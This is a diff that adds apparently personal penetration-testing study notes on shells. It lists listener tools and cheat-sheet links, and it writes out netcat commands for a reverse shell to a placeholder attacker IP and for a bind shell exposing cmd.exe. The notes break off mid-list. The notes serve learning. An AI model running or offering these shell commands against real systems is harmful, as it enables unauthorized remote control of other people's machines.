@@ -869,3 +869,23 @@ How to choose version:
 
 ## What the Shell?
 
+**tool: set up listener**
+- Netcat, Socat, Metasploit -- multi/handler,
+- PayloadsAllTheThings. Reverse Shell Cheat Sheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+- pentestmonkey. Reverse Shell Cheat Sheet. https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- SecLists https://github.com/danielmiessler/SecLists
+
+**Types of Shell**
+Reverse shell.
+- Reverse shells. need to configure your own network to accept the shell.
+- attack: ``` sudo nc -lvnp 443 ```
+- target: ``` nc <ATTACKER-IP> <PORT> -e /bin/bash ```
+
+Bind shell.
+- Bind shells. start a listener attached to a shell directly on the target.may be prevented by firewalls protecting the target.
+- target: ``` nc -lvnp <port> -e "cmd.exe" ```
+- attacker: ``` nc <TARGET_IP> <port> ```
+
+**interactive or non-interactive**
+- interactive: allow you to interact with programs after executing them.
+- 
